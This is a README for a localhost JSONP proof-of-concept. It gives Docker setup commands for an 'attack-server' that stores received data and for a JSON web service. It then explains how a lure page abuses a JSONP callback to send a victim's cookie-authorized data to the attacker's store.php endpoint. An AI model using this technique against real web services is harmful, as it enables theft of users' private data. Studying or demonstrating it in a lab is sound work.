# JSONP-PoC
JSONP (=JSON with padding) is a special method to wrap JSON data in a JavaScript function.
If a webervice allows requests with custom defined callback-functions, the webservice might be vulnerable to JSONP attacks.
How this could be achieved, is described below.

## Starting the attack-server
The attack-server is the server that receives our data and stores it in a file. To do this, we need to make a POST request to http://127.0.0.1:8082/store.php with the `data` parameter. For example:
```
POST /store.php HTTP/1.1
Host: 127.0.0.1:8082
User-Agent: Firefox
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Upgrade-Insecure-Requests: 1

data=test
```
See also `test-post.html` which can be used to make such POST requests.

To start the server:
```
cd attack-server
docker run --rm -p 8082:80 --name attack-server --mount type=bind,source="$(pwd)",target=/var/www/html php:apache
```
The file `./data/data.sav` may still need to be given the correct permissions:
```
docker exec -it attack-server bash
mkdir data
touch data/data.sav
chown -R www-data:www-data data
```

## Starting the (private) json-webserver
```
cd json-webserver
docker run --rm -p 3000:3000 --name json-server -v `pwd`:/data williamyeh/json-server --watch db.json
```

## Stopping the servers
```
docker stop attack-server
docker stop json-server
```

## Checks
Verify if POST-requests can be sent to the attack-server:
```
http://127.0.0.1:8082/test-post.html
```
Change into the docker container and output the file `data.sav`:
```
docker exec -it attack-server bash
cat /var/www/html/data/data.sav
```
The file `data.sav` should contain the string that you sent via the `test-post.html` website.

Check if the json-webserver is running and responds with JSON-data:
```
http://127.0.0.1:3000/posts
```

## PoC
Now assume the following scenario:
If the webservice or the data served by the webservice (json-webserver) is only accessible to authorized users, there is no way to directly access this private data by an attacker. For example, accessibility to the data could be granted to users that include certain cookies or other secrets into their requests. The webservice would then respond to these requests only if the cookies are valid.

If however the webservice allows JSONP, we could create a malicious website that makes requests from the victims browser to the vulnerable webservice. The requests sent from the victims browser would include all necessary cookies to authorize against the webservice.
The only thing to do is to lure the victim to the malicious website.
In our PoC the malicious website is running under
```
http://127.0.0.1:8082/jsonp-attack.html
```

If the victim opens this link, a request to the webservice with a callback parameter is made:
```
http://127.0.0.1:3000/posts?callback=myCallbackServer
```
The callback `myCallbackServer` is a JavaScript-function that takes the data received from the webservice and sends it back to our attack-server via
```
http://127.0.0.1:8082/store.php
```

If the data from the webservice was received corretly can be checked as previously by cat'ing the file `data.sav`:
```
docker exec -it attack-server bash
cat /var/www/html/data/data.sav
```
